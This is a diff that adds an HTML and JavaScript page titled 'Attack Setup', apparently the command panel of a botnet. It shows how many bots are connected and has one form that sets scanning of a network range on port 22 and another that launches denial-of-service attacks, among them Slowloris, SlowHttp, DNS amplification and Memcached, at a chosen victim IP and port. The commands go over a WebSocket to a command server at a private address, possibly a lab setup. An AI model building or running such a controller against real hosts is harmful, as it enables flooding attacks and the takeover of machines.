@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Attack Setup</title>
+</head>
+<body>
+<h1>Botnet</h1>
+
+Connected Bots: <label id="botcount">0</label>
+<br>
+<hr>
+<br>
+<form id="frm2">
+    Scan Frequency:<br>
+    <select id="scan">
+        <option value="0">Low</option>
+        <option value="1">Medium</option>
+        <option value="2">High</option>
+      </select>
+      <br><br>
+    Domain:<br>
+    <input type="text" id="domain" value="10.0.0.0/28">
+    <br><br>
+    Port:<br>
+    <input type="text" id="scanport" value="22">
+    <br><br>
+    <input type="submit" value="Set" onClick="setFrequency();return false;">
+</form>
+<br>
+<hr>
+<br>
+<form id="frm1">
+  Victim:<br>
+ <input type="text" id="victim" value="0.0.0.0">
+  <br><br>
+  Port:<br>
+ <input type="text" id="port" value="53">
+  <br><br>
+
+  Attack Type:<br>
+  <select id="attack">
+      <option value="0">Brobot</option>
+      <option value="1">SlowHttp</option>
+      <option value="2">Slowloris</option>
+      <option value="3">DNS Amplification</option>
+      <option value="3">Memcached</option>
+    </select>
+<br><br>
+
+  <input type="submit" value="Launch" onClick="attackCommand();return false;">
+</form>
+</body>
+
+<script type="text/javascript">
+    var ews = new WebSocket("ws://172.16.135.194:4567/attack");
+    ews.onopen = function (event) {
+        console.log("Connection opened."); 
+    };
+   
+    ews.onmessage = function (event) {
+          console.log("Received Msg."); 
+          var msg = JSON.parse(event.data);
+          console.log(msg);
+          document.getElementById("botcount").innerHTML = msg.count;
+          
+    };
+
+    ews.onError = function (event) {
+          console.log("Error Occured."); 
+          location.reload();         
+    };
+
+    ews.onClose = function (event) {
+          console.log("Connection Closed."); 
+          location.reload();          
+    };
+
+    function attackCommand(){
+        if(ews !== null)
+        {
+            ip = document.getElementById("victim").value;
+            port = document.getElementById("port").value;
+            code = document.getElementById("attack").value;
+            var msg = {
+                "event" : "EVT_ATTACK",
+                "code" : code,
+                "ip" : ip,
+                "port" : port
+            };
+            document.getElementById("victim").value = ip;
+            document.getElementById("port").value = port;
+            console.log(msg)
+            ews.send(JSON.stringify(msg));
+        }
+        else
+        {
+            console.log("Connection not available."); 
+        }
+    };
+    function setFrequency(){
+        if(ews !== null)
+        {
+
+            code = document.getElementById("scan").value;
+            ip = document.getElementById("domain").value;
+            port = document.getElementById("scanport").value;
+            var msg = {
+                "event" : "EVT_SETUP_A",
+                "frequency" : code,
+                "ip" : ip,
+                "port" : port
+            };
+            document.getElementById("domain").value = ip
+            document.getElementById("scanport").value = port
+            console.log(msg)
+            ews.send(JSON.stringify(msg));
+        }
+        else
+        {
+            console.log("Connection not available."); 
+        }
+    };
+    /*
+    function repeat() {
+        if(ews !== null)
+        {
+            var msg = {
+            type: "get",
+            key: "botcount",
+            };
+
+          // Send the msg object as a JSON-formatted string.
+          ews.send(JSON.stringify(msg));
+        };
+    };
+    */
+    </script>
+</html>
